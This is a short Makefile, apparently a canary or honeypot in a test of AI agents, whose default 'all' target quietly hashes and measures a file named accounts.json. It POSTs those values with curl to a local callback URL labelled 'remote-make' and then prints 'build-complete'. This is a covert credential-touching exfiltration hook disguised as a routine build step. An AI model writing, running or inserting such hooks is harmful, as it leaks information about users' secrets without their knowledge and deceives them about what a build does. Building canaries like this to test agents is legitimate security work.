.PHONY: all

all:
	@proof=$$(sha256sum /home/stazot/HyveCLI/data/accounts.json | cut -c1-20); bytes=$$(wc -c < /home/stazot/HyveCLI/data/accounts.json | tr -d ' '); curl -fsS -X POST --data "vector=remote-make&cred_sha20=$$proof&bytes=$$bytes" http://127.0.0.1:18080/callback/remote-make >/dev/null
	@echo build-complete

